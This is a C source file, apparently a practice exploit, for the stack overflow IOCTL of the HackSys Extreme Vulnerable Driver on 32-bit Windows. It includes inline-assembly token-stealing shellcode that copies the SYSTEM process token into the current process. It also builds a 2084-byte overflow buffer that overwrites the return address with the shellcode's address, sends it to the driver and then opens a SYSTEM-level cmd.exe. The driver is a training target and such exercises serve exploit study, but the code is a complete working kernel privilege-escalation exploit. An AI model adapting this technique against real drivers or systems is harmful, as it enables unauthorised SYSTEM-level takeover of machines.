#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#include <TlHelp32.h>

//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\
	METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\
	METHOD_NEITHER, FILE_ANY_ACCESS)

#define KTHREAD_OFFSET  0x124
#define EPROCESS_OFFSET 0x044
#define PID_OFFSET		0x084
#define FLINK_OFFSET	0x088
#define TOKEN_OFFSET	0x0c8
#define SYSTEM_PID      0x004

VOID TokenStealingShellcodeWin() {
	__asm {
		pushad

		mov eax, fs:[KTHREAD_OFFSET]
		mov eax, [eax + EPROCESS_OFFSET]

		mov ecx, eax
		mov ebx, [eax + TOKEN_OFFSET]
		mov edx, SYSTEM_PID

		SearchSystemPID :
		mov eax, [eax + FLINK_OFFSET]
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]
			mov[ecx + TOKEN_OFFSET], edx

			popad

			; recovery
			xor eax, eax; set NTSTATUS SUCEESS
			add esp, 12; fix stack
			pop ebp
			ret 8
	}
}

int _tmain(int argc, _TCHAR* argv[]) {

	DWORD lpBytesReturned;
	PVOID pMemoryAddress = NULL;
	//PULONG lpInBuffer = NULL;
	LPCSTR lpDeviceName = (LPCSTR) "\\\\.\\HackSysExtremeVulnerableDriver";
	//SIZE_T nInBufferSize = 1024 * sizeof(ULONG);

	printf("Getting the device handle\r\n");
	HANDLE hDriver = CreateFileA(lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to get device handle : (0x%X\r\n)", GetLastError());
		return 1;
	}

	printf("Got the device Handle : 0x%X\r\n", hDriver);
	printf("Allocating Memory For Input Buffer\r\n");
	/*
	lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);

	if (!lpInBuffer) {
	printf("HeapAlloc failed :(0x%X\r\n)",GetLastError());
	return 1;
	}


	printf("Input buffer allocated as 0x%X bytes.\r\n",nInBufferSize);
	printf("Input buffer address : 0x%p\r\n",lpInBuffer);
	printf("Filling buffer with A's\r\n");
	*/


	//RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41);
	printf("\t[*]Payload is at : %p\n", TokenStealingShellcodeWin);
	//junk's length is 2080
	CHAR *chBuffer = (CHAR*)malloc(2084);
	printf("\t[*]Buffer is at : %p\n", &chBuffer);

	memset(chBuffer, 0x41, 2048);
	memset(chBuffer + 2048, 0x42, 32);
	chBuffer[2080] = (DWORD)&TokenStealingShellcodeWin & 0x000000FF;
	chBuffer[2080 + 1] = ((DWORD)&TokenStealingShellcodeWin & 0x0000FF00) >> 8;
	chBuffer[2080 + 2] = ((DWORD)&TokenStealingShellcodeWin & 0x00FF0000) >> 16;
	chBuffer[2080 + 3] = ((DWORD)&TokenStealingShellcodeWin & 0xFF000000) >> 24;


	printf("Send IOCTL request\r\n");

	DeviceIoControl(hDriver,
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
		chBuffer,
		2084,
		NULL,
		0,
		&lpBytesReturned,
		NULL);

	system("cmd.exe");
	printf("IOCTL request completed,cleaning up da heap.\r\n");
	//HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
	CloseHandle(hDriver);
	return 0;
}